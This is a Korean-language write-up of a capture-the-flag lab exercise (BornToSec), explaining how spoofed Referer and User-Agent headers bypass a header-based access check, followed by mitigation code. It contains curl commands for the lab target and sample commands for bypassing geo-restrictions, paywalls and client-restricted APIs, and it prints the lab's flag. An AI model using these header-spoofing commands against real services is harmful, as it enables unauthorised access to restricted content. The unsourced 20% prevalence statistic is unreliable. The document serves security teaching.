# 취약점 #9: HTTP 헤더 조작

## 🎯 취약점 유형
**불충분한 HTTP 헤더 검증**
- **OWASP 분류**: A01:2021 - Broken Access Control
- **CWE 분류**: CWE-346 - Origin Validation Error

---

## 🔍 취약점 발견 과정

### 발견: 푸터의 Copyright 링크
**위치**: 홈페이지 하단 푸터

웹사이트 하단에 숨겨진 페이지로 가는 copyright 링크가 있습니다.

![푸터의 Copyright 링크](images/01-copyright-link.png)

**링크**: `© BornToSec` → `?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

### 1단계: Albatross 페이지 접속

**URL**: `http://192.168.64.2/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`

![Albatross 페이지](images/02-albatross-page.png)

**페이지 내용**:
- Albatross(알바트로스) 이미지
- Lorem Ipsum 텍스트
- 오디오 플레이어
- 명확한 flag나 민감한 정보 없음

### 2단계: HTML 소스 코드 분석

**방법**: 우클릭 → "페이지 소스 보기"

![요구사항을 드러내는 HTML 주석](images/03-html-comments.png)

**HTML 주석에서 발견한 핵심 정보**:

```html
<!--
You must come from : "https://www.nsa.gov/".
-->
```

```html
<!--
Let's use this browser : "ft_bornToSec". It will help you a lot.
-->
```

**분석**:
- 서버가 `Referer` 헤더 기대: `https://www.nsa.gov/`
- 서버가 `User-Agent` 헤더 기대: `ft_bornToSec`

**보안 문제**: HTML 주석에 민감한 접근 요구사항 노출!

### 3단계: 수정된 헤더로 공격

**명령어**:
```bash
curl -s 'http://192.168.64.2/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
  -H 'Referer: https://www.nsa.gov/' \
  -H 'User-Agent: ft_bornToSec' \
  | grep -i flag
```

![수정된 헤더로 flag 획득](images/04-flag-obtained.png)

**결과**: ✅ **FLAG 획득!**

**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

---

## 💥 공격 방법

### 방법 1: curl (시연한 방법)

```bash
curl 'http://192.168.64.2/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
  -H 'Referer: https://www.nsa.gov/' \
  -H 'User-Agent: ft_bornToSec'
```

**핵심 포인트**:
- `-H` 플래그로 커스텀 HTTP 헤더 설정
- Referer 헤더: 요청이 어디서 왔는지 나타냄
- User-Agent 헤더: 브라우저/클라이언트 식별

### 방법 2: 브라우저 DevTools (Fetch API)

```javascript
fetch('?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f', {
    headers: {
        'Referer': 'https://www.nsa.gov/'
        // 참고: User-Agent는 보안상 JavaScript로 설정 불가
    }
})
.then(r => r.text())
.then(html => {
    document.body.innerHTML = html;
});
```

**제한사항**: 최신 브라우저는 JavaScript를 통한 User-Agent 수정을 차단합니다.

### 방법 3: 브라우저 확장 프로그램

**ModHeader (Chrome/Firefox)**:
1. ModHeader 확장 프로그램 설치
2. Request Headers 추가:
   - `Referer`: `https://www.nsa.gov/`
   - `User-Agent`: `ft_bornToSec`
3. 페이지 새로고침
4. Flag 표시

### 방법 4: Burp Suite

1. 정상적으로 페이지 접속
2. Burp Suite에서 요청 가로채기
3. 헤더 수정:
   - `Referer: https://www.nsa.gov/` 변경/추가
   - `User-Agent: ft_bornToSec` 변경
4. 요청 전달
5. 응답에서 flag 확인

---

## 🚨 보안 문제점

### 1. 클라이언트가 제어하는 헤더 신뢰

**문제**: 서버가 접근 제어에 HTTP 헤더를 사용합니다.

**취약한 코드** (가상):
```php
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

// 안전하지 않은 검증
if (strpos($referer, 'nsa.gov') !== false &&
    strpos($userAgent, 'ft_bornToSec') !== false) {
    echo "Flag: ...";
} else {
    echo "Access denied";
}
```

**실패하는 이유**:
- HTTP 헤더는 클라이언트가 완전히 제어 가능
- curl, 브라우저 확장, 프록시로 쉽게 위조 가능
- 인증이나 권한 부여에 절대 사용하면 안 됨

### 2. HTML 주석에 요구사항 노출

**문제**: 클라이언트가 볼 수 있는 HTML 주석에 민감한 정보.

**소스에서 발견**:
```html
<!-- You must come from : "https://www.nsa.gov/". -->
<!-- Let's use this browser : "ft_bornToSec". -->
```

**왜 위험한가**:
- 주석은 소스를 보는 누구나 볼 수 있음
- 정확한 우회 요구사항 노출
- 공격자가 보안 메커니즘을 이해하는 데 도움

### 3. 적절한 인증 부재

**문제**: 헤더 대신 적절한 인증에 의존하지 않음.

**누락된 것**:
- 세션 기반 인증
- 토큰 기반 인증 (JWT, OAuth)
- 인증서 기반 인증
- IP 화이트리스팅 (여전히 약하지만 더 나음)

### 4. 약한 접근 제어

**문제**: 모호함을 통한 보안(Security through obscurity).

**문제점**:
- URL의 긴 해시는 보안을 제공하지 않음
- URL을 가진 누구나 헤더만 수정하면 접근 가능
- 헤더 조작 시도에 대한 속도 제한 없음

---

## 🌍 실제 공격 시나리오

### 시나리오 1: 지역 제한 우회

**대상**: 특정 국가로 제한된 서비스

**공격**:
```bash
curl 'http://restricted-service.com/content' \
  -H 'X-Forwarded-For: 192.0.2.1' \
  -H 'Referer: http://approved-country-site.com/'
```

**결과**: 지역 제한 콘텐츠 접근.

### 시나리오 2: Referer 기반 페이월 우회

**대상**: 특정 사이트에서 추천이 필요한 기사

**공격**:
```bash
curl 'http://news-site.com/premium-article' \
  -H 'Referer: https://google.com/'
```

**결과**: 유료 콘텐츠 무료 접근.

### 시나리오 3: User-Agent 기반 접근

**대상**: 특정 클라이언트 애플리케이션이 필요한 API

**공격**:
```bash
curl 'http://api.example.com/data' \
  -H 'User-Agent: OfficialMobileApp/1.0'
```

**결과**: 무단 API 접근.

---

## 🛡️ 완화 방법

### 1. 보안에 HTTP 헤더를 절대 신뢰하지 말 것

**나쁜 관행** ❌:
```php
// 하지 마세요!
if ($_SERVER['HTTP_REFERER'] == 'https://trusted-site.com') {
    grantAccess();
}
```

**좋은 관행** ✅:
```php
// 적절한 인증 사용
if (verifySessionToken($_COOKIE['session_token'])) {
    grantAccess();
}
```

### 2. HTML에서 민감한 정보 제거

**Before** ❌:
```html
<!-- 비밀번호는: admin123 -->
<!-- API 엔드포인트: /api/v2/secret -->
<!-- 다음에서 와야 함: nsa.gov -->
```

**After** ✅:
```html
<!-- 공개 정보만 -->
<!-- 또는 프로덕션에서 주석 완전히 제거 -->
```

**구현**:
```javascript
// 빌드 프로세스: 주석 제거
const html = originalHTML.replace(/<!--[\s\S]*?-->/g, '');
```

### 3. 적절한 인증 구현

**서버 측 세션**:
```php
session_start();

// 로그인 후
$_SESSION['user_id'] = $user_id;
$_SESSION['authenticated'] = true;

// 보호된 페이지에서 확인
if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    http_response_code(401);
    die("Unauthorized");
}
```

**토큰 기반 (JWT)**:
```php
use Firebase\JWT\JWT;

// 로그인 후
$token = JWT::encode([
    'user_id' => $user_id,
    'exp' => time() + 3600
], $secret_key, 'HS256');

// 보호된 페이지에서 검증
$token = $_SERVER['HTTP_AUTHORIZATION'] ?? '';
$decoded = JWT::decode($token, $secret_key, ['HS256']);
```

### 4. 헤더 적절히 검증 (필요한 경우)

**헤더를 확인해야 한다면** (예: CORS):

```php
// 화이트리스트 접근법
$allowed_origins = [
    'https://app1.example.com',
    'https://app2.example.com'
];

$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (in_array($origin, $allowed_origins)) {
    header("Access-Control-Allow-Origin: $origin");
}
```

**Referer의 경우 (로깅/분석만)**:
```php
// 분석용으로 사용, 보안 용도 아님
$referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
logAnalytics(['referer' => $referer, 'page' => $current_page]);
```

### 5. 프로덕션 코드 축소 및 난독화

**빌드 프로세스**:
```bash
# 주석 제거, HTML 축소
html-minifier --remove-comments --collapse-whitespace index.html
```

**장점**:
- 더 작은 파일 크기
- 민감한 주석 제거
- 리버스 엔지니어링 어렵게 만듦

### 6. 속도 제한 구현

```php
$ip = $_SERVER['REMOTE_ADDR'];
$attempts = getAttempts($ip);

if ($attempts > 10) {
    http_response_code(429); // Too Many Requests
    die("속도 제한 초과");
}

incrementAttempts($ip);
```

### 7. 보안 헤더 사용

```apache
# Apache 구성
Header set X-Frame-Options "DENY"
Header set X-Content-Type-Options "nosniff"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Content-Security-Policy "default-src 'self'"
```

---

## 📊 영향 평가

### CVSS 3.1 점수: 5.3 (중간)

**공격 벡터**: 네트워크 (AV:N)
**공격 복잡성**: 낮음 (AC:L)
**필요한 권한**: 없음 (PR:N)
**사용자 상호작용**: 없음 (UI:N)
**범위**: 변경 안 됨 (S:U)
**기밀성**: 낮음 (C:L)
**무결성**: 없음 (I:N)
**가용성**: 없음 (A:N)

### 실제 영향

**성공적인 헤더 조작으로 가능한 것**:
- 접근 제어 우회
- 제한된 콘텐츠 접근
- 지역 제한 회피
- 페이월 우회
- 무단 API 접근

**통계**:
- 웹 애플리케이션의 **20%**에서 헤더 기반 취약점
- 다른 취약점과 자주 결합됨
- 보안 검토에서 자주 간과됨

---

## 📚 참고자료

- [OWASP Access Control](https://owasp.org/www-project-web-security-testing-guide/)
- [CWE-346: Origin Validation Error](https://cwe.mitre.org/data/definitions/346.html)
- [HTTP Headers Security](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)

## 🛠️ 사용된 도구

- **curl**: 헤더 조작이 가능한 커맨드라인 HTTP 클라이언트
- **브라우저 DevTools**: 소스 보기 및 HTML 주석 검사

---
**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`
